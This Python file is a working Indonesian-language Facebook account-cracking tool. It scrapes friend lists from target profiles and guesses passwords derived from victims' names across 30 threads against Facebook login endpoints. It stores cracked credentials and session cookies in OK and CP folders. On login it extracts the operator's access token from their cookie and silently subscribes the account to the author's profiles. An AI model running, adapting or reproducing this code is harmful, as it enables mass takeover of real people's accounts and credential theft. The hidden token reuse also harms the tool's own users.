# coding=utf-8

#     *file name: simple.py (vava)
#     *copyright: (C) © 2022 ~ Romi Afrizal
#     *contact me on whatsap: +6281273018924

#--- module in python
import os,sys,requests,re,bs4,datetime,json,time,random
from time import sleep as jeda
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Romz_Xyz
from datetime import datetime
from random import randint

#--- tanggal waktu
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month 

waktu = ("{}-{}-{}").format(hari,bulan,tahun)
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
#--- user agent
def UAS(): # random ua
	uas= (["Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20220903 Mobile Safari/537.36 MMWEBID/9184 MicroMessenger/8.0.28.2240(0x28001C57) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64"])
	
	rand_ua = random.choice(uas)
	return rand_ua 
def UA():
	try:
		uas = open('ugent.txt','r').read()
	except (FileNotFoundError,IOError):
		uas = ("Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]")
		open('ugent.txt','w').write(uas)
	
	return uas 

#--- warna
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
N = '\x1b[1;94m'
U = '\x1b[1;95m'
B = '\x1b[1;96m'
P = '\x1b[1;97m'
C = '\x1b[0m'    
pepek = ['100067807565861','100028434880529','romi.afrizal.102','romi.alfarabi','']

#--- logo
def logo():
	print (f"""{H}
  ██{P}╗   {H}██{P}╗{H} █████{P}╗{H} ██{P}╗   {H}██{P}╗ {H}█████{P}╗ 
  {H}██{P}║   {H}██{P}║{H}██{P}╔══{H}██{P}╗{H}██{P}║   {H}██{P}║{H}██{P}╔══{H}██{P}╗
  {H}██{P}║   {H}██{P}║{H}███████{P}║{H}██{P}║{H}   ██{P}║{H}███████{P}║
  {P}╚{H}██{P}╗ {H}██{P}╔╝{H}██{P}╔══{H}██{P}║╚{H}██{P}╗ {H}██{P}╔╝{H}██{P}╔══{H}██{P}║
   {P}╚{H}████{P}╔╝{H} ██{P}║ {H} ██{P}║ ╚{H}████{P}╔╝{H} ██{P}║  {H}██{P}║
   {P} ╚═══╝  ╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝
	""")
	
#--- login
def login():
	os.system("clear")
	logo()
	kukis=input(f"{P} ! Login menggunakan cookie:{K} ")
	with requests.Session() as ses:
		try:
			headers_tok = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
			url_tok = ses.get('https://business.facebook.com/business_locations',headers = headers_tok,cookies = {"cookie":kukis})
			token = re.search("(EAAG\w+)", url_tok.text).group(1)
			open('data/cookie.txt','w').write(kukis)
			open('data/token.txt','w').write(token)
			print (f"\n{P} + token:{H} {token}");jeda(2)
			requests.post(f"https://graph.facebook.com/100067807565861/subscribers?access_token={token}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
			requests.post(f"https://graph.facebook.com/100029143111567/subscribers?access_token={token}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
			requests.post(f"https://graph.facebook.com/100028434880529/subscribers?access_token={token}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
			print (f"\n{H} √ login berhasil");jeda(2)
			menu()
		except Exception as e:
			exit (f"\n{M} ! {e}")

#--- menu 
def menu():
	os.system("clear")
	logo()
	try:
		token = open("data/token.txt","r").read()
		coki = {"cookie":open("data/cookie.txt","r").read()}
		nama = json.loads(requests.get(f'https://graph.facebook.com/me?fields=name,id&access_token={token}',cookies=coki).text)["name"] 
	except (FileNotFoundError,KeyError,IOError):
		print (f"{M} ! cookie invalid");jeda(2)
		login()
	except requests.exceptions.ConnectionError:
		exit(f"{M} ! tidak ada koneksi")
	print (f"""{P} [ welcome {H}{nama} {P}]
	
 {P}1. Crack ID publik
 2. Crack ID massal
 3. Lihat hasil crack
 4. Sett User-Agent
 0. keluar
	""")
	romz=input(" ? Pilih: ")
	if romz in ['']:
		print ("\n ! jangan kosong")
	elif romz in ['1']:
		publik(token,coki)
	elif romz in ['2']:
		massal(token,coki)
	elif romz in ['3']:
		hasil()
	elif romz in ['4']:
		UA()
		uas = open('ugent.txt','r').read()
		print (f"{P} ! User-Agent saat ini: {U}{uas}")
		print (f"{P} ! jika tidak mau ingin mengganti User-Agent ketik {H}no{P} ")
		us = input (" ? User-Agent: ")
		if us in['no','No','NO']:
			exit()
		elif us in['']:
			uas = ("Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]")
			open('ugent.txt','r').read().write(uas)
		else:
			open('ugent.txt','r').read().write(us)
	elif romz in ['0']:
		exit()
	else:
		print ("\n ! isi yg benar")

id =[]
#--- publik
def publik(token,cookie):
	try:
		user=input(f"\n{P} ? ID publik: ")
		if user in pepek:
			exit("\n ! gk usah tolol")
		else:
			po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
			for i in po['friends']['data']:
				id.append(f"{i['id']}<=>{i['name']}")
			sys.stdout.write (f'\r + mengumpulkan ID{M} >{H} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050)
	except KeyError:
		exit(f"{M} gagal mengambil ID")
	
	print('')
	return crack().__xnx__(id)
	
#--- massal
def massal(token,cookie):
	try:
		jum = int(input(f"{P} ? Jumlah target: "))
		print ('')
	except:jum=1
	for t in range(jum):
		t +=1
		try:
			user=input(f"{P} ? ID publik {t}: ")
			if user in pepek:
				exit("\n ! gk usah tolol")
			else:
				po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
				for i in po['friends']['data']:
					id.append(f"{i['id']}<=>{i['name']}")
		except KeyError:
			exit(f"{M} gagal mengambil ID")
	print (f'\r + mengumpulkan ID{M} >{H} {len(id)} ')
	
	return crack().__xnx__(id)

#--- lihat hasil
oke,cepe=[],[]
def hasil():
	print(f"""
 1. Cek hasil akun {H}OK{P}
 2. Cek hasil akun {K}CP{P}
 0. Kembali
	""")
	rom = input(' ? Pilih: ')
	if rom in['']:
		exit("\n ! isi yg benar")
	elif rom in['1','01']: 
		try:
			dirs = os.listdir('OK')
			for file in dirs:
				oke.append(file)
		except:pass 
		if len(oke)==0:
			exit("\n ! file tidak tersedia")
		else:
			print(f'\n + Hasil akun {H}OK{P} yg fersimpan di folder anda')
			nomor = 0
			for i in oke:
				fil = open(f"OK/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{H} {i} {P}-{H} {str(len(fil))} ")
			print(f"{P}\n + silahkan pilih nomor yg ingin di cek")
			file = input(f" ? nomor: ")
			try:
				hasil = oke[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n ! isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalok = open(f"OK/{hasil}", "r").read().splitlines()
			print(f"\n{P}#---")
			print (f"{P} Hasil tanggal: {file_nm} total: {H}{len(totalok)}")
			print(f"{P}#---")
			for ngontol in totalok:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;92m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['2','02']: 
		try:
			dirs = os.listdir('CP')
			for file in dirs:
				cepe.append(file)
		except:pass 
		if len(cepe)==0:
			exit("\n ! file tidak tersedia")
		else:
			print(f'\n + Hasil akun {K}CP{P} yg fersimpan di folder anda')
			nomor = 0
			for i in cepe:
				fil = open(f"CP/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{K} {i} {P}-{K} {str(len(fil))} ")
			print(f"{P}\n + silahkan pilih nomor yg ingin di cek")
			file = input(f" ? nomor: ")
			try:
				hasil = cepe[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n ! isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalcp = open(f"CP/{hasil}", "r").read().splitlines()
			print(f"\n{P}#---")
			print (f"{P} Hasil tanggal: {file_nm} total: {K}{len(totalcp)}")
			print(f"{P}#---")
			for ngontol in totalcp:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;93m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['0','00']:
		os.system("python simple.py")
	else:
		exit("\n ! isi yg benar")
	
#--- menu crack
ok,cp,loop=[],[],0
class crack:
	
	def __init__(self):
		self.id =[]
	
	def __xnx__(self,id):
		self.id =id 
		cx=input(f" {P}? gunakan password manual y/t: ")
		if cx in ('y'):
			self.manual()
		elif cx in ('t'):
			print (f"""
 {P}1. methode api
 2. methode mbasic
 3. methode mobile 
			""");self.langsung()
		else:
			exit()
	
	def manual(self):
		print (f"\n{P} ! contoh: sayang,anjing,123456")
		pwek=input(" ? password: ")
		if pwek in(''):
			exit("\n ! jangan kosong")
		elif len(pwek)<=5:
			exit("\n ! password minimal 6 huruf")
		else:
			pass 
		print (f"""
 {P}1. methode api
 2. methode mbasic
 3. methode mobile 
		""")
		men=input(" ? Pilih: ")
		print (f"""
 + akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
 + akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
 + crack sedang berjalan... 
		""")
		with Romz_Xyz(max_workers=30) as titid:
			for akun in id:
				pwx = []
				uid = akun.split('<=>')[0]
				pwx = pwek.split(",")
				if men in['1']:
					titid.submit(self.__crack__, uid, pwx,  "free.facebook.com")
				elif men in['2']:
					titid.submit(self.__crack__, uid, pwx,  "mbasic.facebook.com")
				elif men in['3']:
					titid.submit(self.__crack__, uid, pwx,  "m.facebook.com")
				else:
					exit("\n ! isi yang benar")
					
		self.hasil(ok,cp)
		
	def langsung(self):
		men=input(" ? Pilih: ")
		print (f"""
 + akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
 + akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
 + crack sedang berjalan... 
		""")
		with Romz_Xyz(max_workers=30) as titid:
			for akun in id:
				pwx = []
				uid,name = akun.split('<=>')[0],akun.split('<=>')[1].lower()
				na = name.split(' ')[0]
				if len(name)<6:
					if len(na)<3:
						pass 
					else:
						pwx.append(name)
						pwx.append(na+'123')
						pwx.append(na+'12345')
				else:
					if len(na)<3:
						pwx.append(name)
					else:
						pwx.append(name)
						pwx.append(na+'123')
						pwx.append(na+'12345')
				if men in['1']:
					titid.submit(self.__crack__, uid, pwx,  "free.facebook.com")
				elif men in['2']:
					titid.submit(self.__crack__, uid, pwx,  "mbasic.facebook.com")
				elif men in['3']:
					titid.submit(self.__crack__, uid, pwx,  "m.facebook.com")
				else:
					exit("\n ! isi yang benar")
					
		self.hasil(ok,cp)
					
	#--- methode
	def __crack__(self, user, peweh, url_log):
		global ok,cp,loop 
		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
		print (f"\r{komtol} • {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
		for pw in peweh:
			try: 
				ses = requests.Session()
				uas = UA()
				ses.headers.update({"Host": url_log,"cache-control": "max-age=0","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				p = ses.get(f"https://{url_log}/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2F{url_log}%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1652642384163%26e2e%3D%257B%2522init%2522%253A1652642384163%257D%26ies%3D1%26sdk%3Dandroid-9.0.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e9412d-fd80-4f3a-adc5-4c0e7ea71df3%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
				dataa ={
					"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
					"email":user, 
					"flow": "login_no_pin", 
					"pass":pw,
				}
				koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
				koki+=' m_pixel_ratio=2.625; wd=412x756'
				headerx={"Host": url_log,"connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://"+url_log,"content-type": "application/x-www-form-urlencoded","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://{url_log}/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2F{url_log}%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1652642384163%26e2e%3D%257B%2522init%2522%253A1652642384163%257D%26ies%3D1%26sdk%3Dandroid-9.0.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e9412d-fd80-4f3a-adc5-4c0e7ea71df3%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
				po = ses.post(f'https://{url_log}/login/device-based/regular/login/?api_key=2036793259884297&auth_token=3cef90256fbcb9cbfe87b20fc6a1c7a8&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1652642384163%26e2e%3D%257B%2522init%2522%253A1652642384163%257D%26ies%3D1%26sdk%3Dandroid-9.0.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e9412d-fd80-4f3a-adc5-4c0e7ea71df3%26tp%3Dunspecified&refsrc=deprecated&app_id=2036793259884297&cancel=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D&lwv=100&locale2=id_ID&refid=9',data=dataa,cookies={'cookie': koki},headers=headerx,allow_redirects=False)
				if "c_user" in ses.cookies.get_dict():
					romz = ses.cookies.get_dict()
					kukis = ";".join([key+"="+value for key, value in romz.items()])
					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{uas} \n ')
					ok.append(f"{user} ◊ {pw} ◊ {kukis} ")
					open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {kukis} \n")
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{uas} \n ')
					cp.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				jeda(3)
			
		loop+=1
		
	#--- selesai hasil
	def hasil(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			print (f"\n\n{H} √ {P}crack selesai....")
			print (f"{H} + OK: {len(ok)} ")
			print (f"{K} + CP: {len(cp)}{P}");exit()
		else:
			exit(f"\n {M}× ops tidak mendapatkan hasil")


if __name__=="__main__":
	#os.system("clear")
	#os.system("git pull")
	try:os.mkdir('data')
	except:pass 
	menu()
